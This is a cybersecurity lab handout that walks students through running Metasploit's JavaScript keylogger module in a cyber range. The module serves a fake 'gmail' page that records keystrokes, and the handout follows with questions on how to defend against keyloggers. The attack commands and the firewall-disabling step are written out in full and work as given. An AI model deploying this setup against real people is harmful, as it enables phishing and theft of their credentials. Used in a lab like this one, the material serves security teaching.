# Keylogging Lab Instructions

## Preparation
- Kali Linux Virtual Machine
- Windows 7 Virtual Machine
- Software Tools used (both from Kali Linux OS)
  -	Metasploit Framework
  - Web JavaScript Keylogger Exploit

## Setup Environments
- Log into the cyber range
- Open the Kali Linux and Windows 7 Environments
- In Windows, change your network location
  - Click on the Windows Start button
  - Search for “Network”
  - Open the Network and Sharing Center program
  - Under your Network #, click on the “Public Network”
  - Select the “Home Network” option (This disables the Windows Firewall)

- Find the IP Address (Kali Machine). You will need the IP address of the Kali machine
  - Open the Terminal in your Kali machine and type the following command: 
```sh 
hostname -I
```
This will display the IP Address

  - Write down the Kali VM IP address

- Find the IP Address (Windows Machine)
  - Select the Start button (Windows Machine) and search for “cmd”
  - Open cmd (Command Prompt)
  - Use the following command: 
```sh
ipconfig
```
  - Search for the IPv4 Address line
  - Write down the Windows IP Address

## Initialize Metasploit

- In the Kali environment, open Terminal
- Type the following command to start the database:
```sh
sudo systemctl start postgresql 
```
- Type the following command to start the Metasploit framework:
```sh
sudo msfdb init
sudo msfconsole
```
You should notice that Metasploit console has started, and you should now see the following: 
```sh
msf >
```
Start the Keylogger Attack
- Type:
```sh
use auxiliary/server/capture/http_javascript_keylogger
```
- Type the following to see options for this attack:
```sh
show options
```
- Type the following to turn the demo on:
```sh
set demo True
```
- Set the keylogger server port to port 1717 with the following command:
```sh
set SRVPORT 1717
```
- Set the server host with the following command (replace Kali_IP_Address with the IP address you found earlier for your Kali machine):
```sh
set SRVHOST Kali_IP_Address
```
Run the keylogger attacker: Type run to start the server:
```sh
run
```
Starting the Attack
- Break/Stop the server by pressing CTRL+C
- Now, set the URI path the “Gmail” by tryping the following command:
```sh 
set URIPATH gmail
```
- Rerun the capture by entering the run command again:
```sh
run
```

- Write down the URL the server is currently using. It should look like the following:
           http://10.1.90.93:1717/gmail

Playing the Victim
- In the Windows environment, open the Chrome Browser
- Go to the website of the URL you wrote down.
- Add “/demo” to the end of this URL. It should look something like the following
           http://10.1.57.93:1717/gmail/demo
- You should see a "Keylogger Demo Form" page
- Type in fake credentials as if you were going to log into a website

Seeing the Attack
- Go back to Kali
- Notice it recorded every keystroke!

Discuss ways to defend against a Key Logger
- Only use credentials at trusted websites!
- What was the website URL you entered your credentials in?
- Avoid re-using passwords across multiple websites
- If one site steals your password once, they're all the same...
- Use a firewall!
- Remember you disabled the firewall at the beginning of this lab
- Firewalls help prevent malicious software from sending out data without you knowing
- Two-Factor Authentication
- Why would these help secure your password?
- What are some other ways of defending against a keylogger attack?



